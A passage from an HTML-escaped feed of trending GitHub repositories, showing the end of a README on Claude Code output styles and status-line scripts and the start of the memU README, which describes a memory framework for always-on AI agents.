   &lt;td&gt;&lt;strong&gt;bullet-points&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Clean nested lists with dashes and numbers&lt;/td&gt; 
   &lt;td&gt;Action items, documentation, task tracking&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;ultra-concise&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Minimal words, maximum speed&lt;/td&gt; 
   &lt;td&gt;Experienced devs, rapid prototyping&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;html-structured&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Semantic HTML5 with data attributes&lt;/td&gt; 
   &lt;td&gt;Web documentation, rich formatting&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;markdown-focused&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Leverages all markdown features optimally&lt;/td&gt; 
   &lt;td&gt;Complex documentation, mixed content&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;tts-summary&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Announces task completion via ElevenLabs TTS&lt;/td&gt; 
   &lt;td&gt;Audio feedback, accessibility&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt; Run &lt;code&gt;/output-style [name]&lt;/code&gt; to activate any style (e.g., &lt;code&gt;/output-style table-based&lt;/code&gt;)&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Location:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Project styles: &lt;code&gt;.claude/output-styles/*.md&lt;/code&gt; (this repo)&lt;/li&gt; 
 &lt;li&gt;User styles: &lt;code&gt;~/.claude/output-styles/*.md&lt;/code&gt; (global)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Output styles modify Claude's system prompt to change response formatting without affecting core functionality. Each style is a markdown file with YAML frontmatter defining the name, description, and formatting instructions.&lt;/p&gt; 
&lt;h2&gt;Custom Status Lines&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Watch the walkthrough:&lt;/strong&gt; See these features in action at &lt;a href="https://youtu.be/mJhsWrEv-Go"&gt;https://youtu.be/mJhsWrEv-Go&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;This project includes enhanced Claude Code status lines that display real-time conversation context. Status lines provide dynamic information at the bottom of your terminal during Claude Code sessions. See the &lt;a href="https://docs.anthropic.com/en/docs/claude-code/statusline"&gt;official documentation&lt;/a&gt; for complete details.&lt;/p&gt; 
&lt;h3&gt;Available Status Lines&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Location:&lt;/strong&gt; &lt;code&gt;.claude/status_lines/&lt;/code&gt;&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Version&lt;/th&gt; 
   &lt;th&gt;File&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Features&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v1&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Basic MVP&lt;/td&gt; 
   &lt;td&gt;Git branch, directory, model info&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v2&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v2.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Smart prompts&lt;/td&gt; 
   &lt;td&gt;Latest prompt (250 chars), color-coded by task type&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v3&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v3.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Agent sessions&lt;/td&gt; 
   &lt;td&gt;Agent name, model, last 3 prompts&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v4&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v4.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Extended metadata&lt;/td&gt; 
   &lt;td&gt;Agent name, model, latest prompt, custom key-value pairs&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v5&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v5.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Cost tracking&lt;/td&gt; 
   &lt;td&gt;Model, cost ($), line changes (+/-), session duration&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v6&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v6.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Context window&lt;/td&gt; 
   &lt;td&gt;Visual usage bar, percentage, tokens remaining&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v7&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v7.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Duration timer&lt;/td&gt; 
   &lt;td&gt;Session time, start time, optional end time&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v8&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v8.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Token/cache stats&lt;/td&gt; 
   &lt;td&gt;Input/output tokens, cache creation/read stats&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v9&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v9.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Powerline minimal&lt;/td&gt; 
   &lt;td&gt;Stylized segments with powerline separators, git branch, % used&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Session Management&lt;/h3&gt; 
&lt;p&gt;Status lines leverage session data stored in &lt;code&gt;.claude/data/sessions/&amp;lt;session_id&amp;gt;.json&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "session_id": "unique-session-id",
  "prompts": ["first prompt", "second prompt", ...],
  "agent_name": "Phoenix",  // Auto-generated unique name
  "extras": {              // v4: Custom metadata (optional)
    "project": "myapp",
    "status": "debugging",
    "environment": "prod"
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Agent Naming:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Automatically generates unique agent names using LLM services&lt;/li&gt; 
 &lt;li&gt;Priority: Ollama (local) ‚Üí Anthropic ‚Üí OpenAI ‚Üí Fallback names&lt;/li&gt; 
 &lt;li&gt;Names are single-word, memorable identifiers (e.g., Phoenix, Sage, Nova)&lt;/li&gt; 
 &lt;li&gt;Enabled via &lt;code&gt;--name-agent&lt;/code&gt; flag in &lt;code&gt;user_prompt_submit.py&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Custom Metadata (v4):&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Use &lt;code&gt;/update_status_line&lt;/code&gt; command to add custom key-value pairs&lt;/li&gt; 
 &lt;li&gt;Displayed at the end of the status line in cyan brackets&lt;/li&gt; 
 &lt;li&gt;Persists across Claude Code interactions&lt;/li&gt; 
 &lt;li&gt;Example: &lt;code&gt;/update_status_line &amp;lt;session_id&amp;gt; project myapp&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;p&gt;Set your preferred status line in &lt;code&gt;.claude/settings.json&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "statusLine": {
    "type": "command",
    "command": "uv run $CLAUDE_PROJECT_DIR/.claude/status_lines/status_line_v3.py"
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Status Line Features:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Real-time updates&lt;/strong&gt; - Refreshes on message changes (300ms throttle)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Color coding&lt;/strong&gt; - Visual indicators for different task types&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Smart truncation&lt;/strong&gt; - Manages long prompts elegantly&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Session persistence&lt;/strong&gt; - Maintains context across interactions&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Task Type Indicators (v2/v3):&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;üîç Purple - Analysis/search tasks&lt;/li&gt; 
 &lt;li&gt;üí° Green - Creation/implementation tasks&lt;/li&gt; 
 &lt;li&gt;üîß Yellow - Fix/debug tasks&lt;/li&gt; 
 &lt;li&gt;üóëÔ∏è Red - Deletion tasks&lt;/li&gt; 
 &lt;li&gt;‚ùì Blue - Questions&lt;/li&gt; 
 &lt;li&gt;üí¨ Default - General conversation&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Master Agentic Coding&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Prepare for the future of software engineering&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Learn tactical agentic coding patterns with &lt;a href="https://agenticengineer.com/tactical-agentic-coding?y=ssvhooks"&gt;Tactical Agentic Coding&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Follow the &lt;a href="https://www.youtube.com/@indydevdan"&gt;IndyDevDan YouTube channel&lt;/a&gt; to improve your agentic coding advantage.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>NevaMind-AI/memU</title>
      <link>https://github.com/NevaMind-AI/memU</link>
      <description>&lt;p&gt;Memory for 24/7 proactive agents like openclaw (moltbot, clawdbot).&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/banner.png" alt="MemU Banner" /&gt;&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;h1&gt;memU&lt;/h1&gt; 
 &lt;h3&gt;24/7 Always-On Proactive Memory for AI Agents&lt;/h3&gt; 
 &lt;p&gt;&lt;a href="https://badge.fury.io/py/memu-py"&gt;&lt;img src="https://badge.fury.io/py/memu-py.svg?sanitize=true" alt="PyPI version" /&gt;&lt;/a&gt; &lt;a href="https://opensource.org/licenses/Apache-2.0"&gt;&lt;img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg?sanitize=true" alt="License: Apache 2.0" /&gt;&lt;/a&gt; &lt;a href="https://www.python.org/downloads/"&gt;&lt;img src="https://img.shields.io/badge/python-3.13+-blue.svg?sanitize=true" alt="Python 3.13+" /&gt;&lt;/a&gt; &lt;a href="https://discord.gg/memu"&gt;&lt;img src="https://img.shields.io/badge/Discord-Join%20Chat-5865F2?logo=discord&amp;amp;logoColor=white" alt="Discord" /&gt;&lt;/a&gt; &lt;a href="https://x.com/memU_ai"&gt;&lt;img src="https://img.shields.io/badge/Twitter-Follow-1DA1F2?logo=x&amp;amp;logoColor=white" alt="Twitter" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;a href="https://trendshift.io/repositories/17374" target="_blank"&gt;&lt;img src="https://trendshift.io/api/badge/repositories/17374" alt="NevaMind-AI%2FmemU | Trendshift" style="width: 250px; height: 55px;" width="250" height="55" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_en.md"&gt;English&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_zh.md"&gt;‰∏≠Êñá&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_ja.md"&gt;Êó•Êú¨Ë™û&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_ko.md"&gt;ÌïúÍµ≠Ïñ¥&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_es.md"&gt;Espa√±ol&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_fr.md"&gt;Fran√ßais&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
&lt;p&gt;memU is a memory framework built for &lt;strong&gt;24/7 proactive agents&lt;/strong&gt;. It is designed for long-running use and greatly &lt;strong&gt;reduces the LLM token cost&lt;/strong&gt; of keeping agents always online, making always-on, evolving agents practical in production systems. memU &lt;strong&gt;continuously captures and understands user intent&lt;/strong&gt;. Even without a command, the agent can tell what you are about to do and act on it by itself.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;ü§ñ &lt;a href="https://memu.bot"&gt;OpenClaw (Moltbot, Clawdbot) Alternative&lt;/a&gt;&lt;/h2&gt; 
&lt;img width="100%" src="https://github.com/NevaMind-AI/memU/raw/main/assets/memUbot.png" /&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Download-and-use and simple&lt;/strong&gt; to get started.&lt;/li&gt; 
 &lt;li&gt;Builds long-term memory to &lt;strong&gt;understand user intent&lt;/strong&gt; and act proactively.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Cuts LLM token cost&lt;/strong&gt; with smaller context.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Try now: &lt;a href="https://memu.bot"&gt;memU bot&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üóÉÔ∏è Memory as File System, File System as Memory&lt;/h2&gt; 
&lt;p&gt;memU treats &lt;strong&gt;memory like a file system&lt;/strong&gt;‚Äîstructured, hierarchical, and instantly accessible.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;File System&lt;/th&gt; 
   &lt;th&gt;memU Memory&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üìÅ Folders&lt;/td&gt; 
   &lt;td&gt;üè∑Ô∏è Categories (auto-organized topics)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üìÑ Files&lt;/td&gt; 
   &lt;td&gt;üß† Memory Items (extracted facts, preferences, skills)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üîó Symlinks&lt;/td&gt; 
   &lt;td&gt;üîÑ Cross-references (related memories linked)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üìÇ Mount points&lt;/td&gt; 
   &lt;td&gt;üì• Resources (conversations, documents, images)&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Why this matters:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Navigate memories&lt;/strong&gt; like browsing directories‚Äîdrill down from broad categories to specific facts&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Mount new knowledge&lt;/strong&gt; instantly‚Äîconversations and documents become queryable memory&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Cross-link everything&lt;/strong&gt;‚Äîmemories reference each other, building a connected knowledge graph&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Persistent &amp;amp; portable&lt;/strong&gt;‚Äîexport, backup, and transfer memory like files&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code&gt;memory/
‚îú‚îÄ‚îÄ preferences/
‚îÇ   ‚îú‚îÄ‚îÄ communication_style.md
‚îÇ   ‚îî‚îÄ‚îÄ topic_interests.md
‚îú‚îÄ‚îÄ relationships/
‚îÇ   ‚îú‚îÄ‚îÄ contacts/
‚îÇ   ‚îî‚îÄ‚îÄ interaction_history/
‚îú‚îÄ‚îÄ knowledge/
‚îÇ   ‚îú‚îÄ‚îÄ domain_expertise/
‚îÇ   ‚îî‚îÄ‚îÄ learned_skills/
‚îî‚îÄ‚îÄ context/
    ‚îú‚îÄ‚îÄ recent_conversations/
    ‚îî‚îÄ‚îÄ pending_tasks/
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Just as a file system turns raw bytes into organized data, memU transforms raw interactions into &lt;strong&gt;structured, searchable, proactive intelligence&lt;/strong&gt;.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;‚≠êÔ∏è Star the repository&lt;/h2&gt; 
&lt;img width="100%" src="https://github.com/NevaMind-AI/memU/raw/main/assets/star.gif" /&gt; If you find memU useful or interesting, a GitHub Star ‚≠êÔ∏è would be greatly appreciated. 
&lt;hr /&gt; 
&lt;h2&gt;‚ú® Core Features&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Capability&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ü§ñ &lt;strong&gt;24/7 Proactive Agent&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Always-on memory agent that works continuously in the background‚Äînever sleeps, never forgets&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üéØ &lt;strong&gt;User Intention Capture&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Understands and remembers user goals, preferences, and context across sessions automatically&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;üí∞ &lt;strong&gt;Cost Efficient&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Reduces long-running token costs by caching insights and avoiding redundant LLM calls&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üîÑ How Proactive Memory Works&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;
cd examples/proactive
python proactive.py

&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Proactive Memory Lifecycle&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                                         USER QUERY                                               ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ                                                           ‚îÇ
                 ‚ñº                                                           ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ         ü§ñ MAIN AGENT                  ‚îÇ         ‚îÇ              üß† MEMU BOT                       ‚îÇ
‚îÇ                                        ‚îÇ         ‚îÇ                                                ‚îÇ
‚îÇ  Handle user queries &amp;amp; execute tasks   ‚îÇ  ‚óÑ‚îÄ‚îÄ‚îÄ‚ñ∫  ‚îÇ  Monitor, memorize &amp;amp; proactive intelligence   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§         ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                        ‚îÇ         ‚îÇ                                                ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ         ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ  1. RECEIVE USER INPUT           ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ  1. MONITOR INPUT/OUTPUT                 ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Parse query, understand      ‚îÇ  ‚îÇ   ‚îÄ‚îÄ‚îÄ‚ñ∫  ‚îÇ  ‚îÇ     Observe agent interactions           ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     context and intent           ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ     Track conversation flow              ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ         ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îÇ                 ‚îÇ                      ‚îÇ         ‚îÇ                    ‚îÇ                           ‚îÇ
‚îÇ                 ‚ñº                      ‚îÇ         ‚îÇ                    ‚ñº                           ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ         ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ  2. PLAN &amp;amp; EXECUTE               ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ  2. MEMORIZE &amp;amp; EXTRACT                   ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Break down tasks             ‚îÇ  ‚îÇ   ‚óÑ‚îÄ‚îÄ‚îÄ  ‚îÇ  ‚îÇ     Store insights, facts, preferences   ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Call tools, retrieve data    ‚îÇ  ‚îÇ  inject ‚îÇ  ‚îÇ     Extract skills &amp;amp; knowledge           ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Generate responses           ‚îÇ  ‚îÇ  memory ‚îÇ  ‚îÇ     Update user profile                  ‚îÇ  ‚îÇ
